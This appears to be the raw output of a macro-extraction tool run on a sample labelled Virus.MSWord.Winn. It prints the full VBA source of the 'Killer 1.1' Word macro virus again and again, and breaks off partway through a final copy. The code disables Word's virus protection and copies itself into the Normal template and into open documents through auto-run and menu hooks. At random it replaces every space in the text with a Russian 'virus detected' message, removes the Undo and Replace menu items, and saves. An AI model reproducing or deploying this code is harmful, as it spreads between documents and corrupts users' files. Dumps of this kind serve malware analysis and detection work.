- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer14.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer15.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer16.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer17.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer18.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer19.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer19'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer20.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer20'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer21.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer22.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer23.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer24.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer24'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer25.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer25'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.Name = "killer" Or ActiveDocument.VBProject.Name = "killer" Then GoTo out
    NormalTemplate.VBProject.VBComponents.import "c:\windows\winnews.txt"
    NormalTemplate.VBProject.Name = "killer"
    ActiveDocument.VBProject.VBComponents.import "c:\windows\winnews.txt"
    ActiveDocument.VBProject.Name = "killer"
out:
    Dim c As Integer
    c = Int(Rnd * 50)
    If c = 35 Then Call kill
End Sub

Sub HelpAbout()
On Error Resume Next
Call killer
End Sub
Sub FileSave()
On Error Resume Next
Call killer
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call killer
End Sub
Sub AutoOpen()
On Error Resume Next
Call killer
End Sub
Sub AutoClose()
On Error Resume Next
Call killer
End Sub
Sub ToolsMacro()
On Error Resume Next
Call killer
End Sub
Sub ViewVBCode()
On Error Resume Next
Call killer
End Sub
Sub kill()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .text = " "
            .Replacement.text = "На кампе обнаружен вирус!!!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Private Sub autonew()
    On Error Resume Next
    Call killer
End Sub
-------------------------------------------------------------------------------
VBA MACRO killer26.bas 
in file: Virus.MSWord.Winn - OLE stream: 'Macros/VBA/killer26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Killer 1.1 ©S&L 2000
Const SluzhFile = "c:\windows\winnews.txt"
Sub killer()
    On Error Resume Next
    Randomize
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    NormalTemplate.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.VBProject.VBComponents("killer").Export "c:\windows\winnews.txt"
    ActiveDocument.ReadOnlyRecommended = False
